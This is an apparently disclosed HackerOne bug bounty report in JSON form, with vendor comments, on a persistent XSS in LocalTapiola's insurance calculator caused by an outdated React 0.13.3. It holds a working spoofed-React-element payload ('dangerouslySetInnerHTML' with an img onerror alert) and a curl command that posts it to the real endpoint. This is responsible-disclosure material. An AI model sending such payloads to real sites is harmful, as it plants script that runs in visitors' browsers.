{"id":139004,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzkwMDQ=","url":"https://hackerone.com/reports/139004","title":"Persistent XSS at verkkopalvelu.tapiola.fi using spoofed React element and React v.0.13.3","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-15T21:21:03.025Z","submitted_at":"2016-05-15T21:21:03.025Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fransrosen","url":"/fransrosen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-27T22:32:08.453Z","bug_reporter_agreed_on_going_public_at":"2016-06-27T22:32:08.376Z","team_member_agreed_on_going_public_at":"2016-06-27T22:26:59.450Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\n## Background\nI noticed that the app at:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/\n\nwas running an old version of React. In this version (0.13.3) there's an issue, initially discovered by @danlec actually on HackerOne: http://danlec.com/blog/xss-via-a-spoofed-react-element \n\nThe patch by React was made in version 0.14: https://facebook.github.io/react/blog/2015/10/07/react-v0.14.html\n\n## PoC\n\nSo I noticed that the application had a possible way to save a registration in the middle of the process, being able to get an URL to continue with the registration. This save would make a call that looked like this:\n\n```\nPOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nContent-Type: application/json\n\n{\n    \"79rtwta5z4hjkn3npvu5ak0521\": {\n        \"dateOfIntroduction\": {\n            \"isValid\": true, \n            \"error\": \"\", \n...\n}\n```\n\nThis would then respond with a unique identifier:\n```\n{\"id\":\"ID\"}\n```\nThis data would then be used, if you used a link formatted like this:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/ID\n\nThe problem, apart from running an old version of React, is that the JSON being saved is not controlled in any way what content it has, which means you're able to extend the JSON further. Now, the content in the elements are being placed inside the DOM of the page, especially the `\"error\"`-element.\n\nSo, to use @danlec's way to inject a spoofed React element, we use the following request:\n\n```\nPOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nConnection: keep-alive\nContent-Length: 875\nAccept: application/json, text/javascript\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nCookie: caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789;\n\n{\"79rtwta5z4hjkn3npvu5ak0521\":{\"postCode\":{\"isValid\":true,\"error\":{\"_store\":{},\"type\":\"body\",\"props\":{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cimg src=x onerror=alert(document.domain)\u003e\"}},\"_isReactElement\":true},\"value\":\"jjj\"},\"dateOfIntroduction\":{\"isValid\":true,\"error\":\"\",\"value\":\"JAJAJA\"},\"cylinderCapacity\":{\"isValid\":true,\"error\":\"\",\"value\":\"yyy\"},\"manufacturerCode\":{\"isValid\":true,\"error\":\"\",\"value\":\"zzz\"},\"netPower\":{\"isValid\":true,\"error\":\"\",\"value\":\"bbb\"},\"birthDate\":{\"isValid\":true,\"error\":\"\",\"value\":\"11.11.2011xxx\"},\"grossWeight\":{\"isValid\":true,\"error\":\"\",\"value\":\"ccc\"},\"carType\":{\"isValid\":true,\"error\":\"\",\"value\":\"x\"},\"isRentedOrLeased\":{\"isValid\":true,\"error\":\"\",\"value\":\"eee\"},\"registrationPart2\":{\"isValid\":true,\"error\":\"\",\"value\":\"fff\"},\"modelCode\":{\"isValid\":true,\"error\":\"\",\"value\":\"ggg\"},\"registrationPart1\":{\"isValid\":true,\"error\":\"\",\"value\":\"hhh\"}}}\n```\n\nYou can see my inserted payload here:\nhttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\n\nWhich would then result in the following URL using the React app:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\n\nWhich has the following output in the DOM:\n\n{F94020}\n\nThat results in the javascript running when accessing the page:\n\n{F94022}\n\n## Solution\n\nYou should update the React version to \u003e0.14 (and most likely also change so the structure of the JSON that is getting saved is controlled by you.\n\nRegards,\nFrans","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":94020,"file_name":"Screen_Shot_2016-05-15_at_23.09.13.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/020/9bc61b08fed82c63adfa74d759f999c11f462f1a/Screen_Shot_2016-05-15_at_23.09.13.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.09.13.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.09.13.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134021Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=38bda343ed360c5014869f2a32ff341f486be79aae1a42561d37e998d5a3ae64","file_size":78509,"type":"image/png"},{"id":94022,"file_name":"Screen_Shot_2016-05-15_at_23.00.25.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/022/8c7069981da948310e62733c5fe99807a713c5e5/Screen_Shot_2016-05-15_at_23.00.25.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.00.25.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.00.25.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134021Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ccd1b7baa6850639d3ee8b31761106077360e0bcf2435c732275d14c9d859d9a","file_size":209565,"type":"image/png"}],"allow_singular_disclosure_at":"2016-07-27T22:26:59.513Z","allow_singular_disclosure_after":-164301202.1030819,"singular_disclosure_allowed":true,"vote_count":26,"voters":["fransrosen","mashoud1122","jobert","michiel","bogdantcaciuc","r3y","zephrfish","malcolmx","lars","jens","and 16 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":958582,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.","automated_response":false,"created_at":"2016-05-16T06:20:48.698Z","updated_at":"2016-05-16T06:20:48.698Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":969898,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A quick update on this one. We have forwarded your finding to the 3rd party responsible for this service and we are awaiting their response. Please have patience while we are investigating.","automated_response":false,"created_at":"2016-05-23T12:30:43.252Z","updated_at":"2016-05-23T12:30:43.252Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":994538,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @fransrosen . A fix for this report has been issued and injecting malicious content is not possible anymore. There is a low risk injection possibility still in the application. We will not accept any reports on that issue, as it is known and accepted risk. Bounty decisions will be made next Monday and we can have full disclosure at that point. We would appreciate if you can verify the fix from your point of view also.","automated_response":false,"created_at":"2016-06-01T09:16:32.976Z","updated_at":"2016-06-01T09:16:32.976Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":994686,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nIs the fix actually deployed? I was able to reproduce the issue again.\n\nPoC-link: https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nI first ran this command:\n```\ncurl -i -s -k  -X 'POST' \\\n    -H 'Content-Type: application/json' \\\n    -b 'caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789' \\\n    --data-binary $'{\\\"79rtwta5z4hjkn3npvu5ak0521\\\":{\\\"postCode\\\":{\\\"isValid\\\":true,\\\"error\\\":{\\\"_store\\\":{},\\\"type\\\":\\\"body\\\",\\\"props\\\":{\\\"dangerouslySetInnerHTML\\\":{\\\"__html\\\":\\\"\u003cimg src=x onerror=alert(document.domain)\u003e\\\"}},\\\"_isReactElement\\\":true},\\\"value\\\":\\\"jjj\\\"},\\\"dateOfIntroduction\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"JAJAJA\\\"},\\\"cylinderCapacity\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"yyy\\\"},\\\"manufacturerCode\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"zzz\\\"},\\\"netPower\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"bbb\\\"},\\\"birthDate\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"11.11.2011xxx\\\"},\\\"grossWeight\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"ccc\\\"},\\\"carType\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"x\\\"},\\\"isRentedOrLeased\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"eee\\\"},\\\"registrationPart2\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"fff\\\"},\\\"modelCode\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"ggg\\\"},\\\"registrationPart1\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"hhh\\\"}}}' \\\n    'https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/'\n```\n\nThe ID I got back, I then used in the following link:\n```\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/XXX\n```\nwhere XXX is the ID I got. As I see it, I'm still able to inject the arbitrary elements into the JSON located here:\nhttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nCheers,\nFrans","automated_response":false,"created_at":"2016-06-01T12:44:28.647Z","updated_at":"2016-06-01T12:44:28.647Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":994687,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just for clarity, could you post screenshots of your findings?","automated_response":false,"created_at":"2016-06-01T12:46:31.177Z","updated_at":"2016-06-01T12:46:31.177Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":994692,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Absolutely!\nI've attached two images, one showing the payload with the extended JSON-elements, used for the attack, the other one showing what happens when I visit:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nRegards,\nFrans\n","automated_response":false,"created_at":"2016-06-01T12:48:21.777Z","updated_at":"2016-06-01T12:48:21.777Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":97288,"filename":"Screen_Shot_2016-06-01_at_14.42.25.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/288/488d72443ff3eaf714229ad0f45cb7d5da04e917/Screen_Shot_2016-06-01_at_14.42.25.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-06-01_at_14.42.25.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-06-01_at_14.42.25.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134021Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3475b0bd27ed98163174363d9a73e24a002c545b45bcbe398359375f934233a0"},{"id":97289,"filename":"Screen_Shot_2016-06-01_at_14.47.02.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/289/afe5fcc2c2a4dc7d5b3ba30905b435eb5e8907a0/Screen_Shot_2016-06-01_at_14.47.02.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-06-01_at_14.47.02.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-06-01_at_14.47.02.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134021Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c24631d0c664435ab06a7dcc45d4640989d44d303e175c2710c17e40401d4b96"}],"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":994693,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To be clear - there is still in injection issue, but your should not be able to inject any malicious code and trigger javascript/xss.","automated_response":false,"created_at":"2016-06-01T12:48:34.483Z","updated_at":"2016-06-01T12:48:34.483Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":994695,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, will send this back to the team.","automated_response":false,"created_at":"2016-06-01T12:49:10.478Z","updated_at":"2016-06-01T12:49:10.478Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":995612,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry - this was my bad I misread the test results. This fix is NOT deployed to production yet. I will of course keep you up to date when that actually happens.","automated_response":false,"created_at":"2016-06-01T20:43:44.464Z","updated_at":"2016-06-01T20:43:44.464Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1026464,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, this could be retested by you - we have now verified the fix. Please do not that the fix is limited in a sense: spoofed content can still be included in a saved form but malicious content is filtered.","automated_response":false,"created_at":"2016-06-21T13:37:27.170Z","updated_at":"2016-06-21T13:37:27.170Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1027036,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nI can now confirm this is fixed, I'm not able to inject additional nodes to the JSON, 